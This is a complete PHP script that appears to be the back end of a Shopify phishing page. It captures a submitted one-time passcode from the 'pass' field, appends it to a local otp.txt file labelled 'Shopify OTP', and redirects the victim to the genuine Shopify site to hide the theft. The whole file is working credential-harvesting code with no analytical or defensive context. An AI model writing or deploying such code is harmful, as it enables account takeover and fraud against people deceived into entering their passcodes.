<?php
file_put_contents("otp.txt", "Shopify OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.shopify.in/');
?>
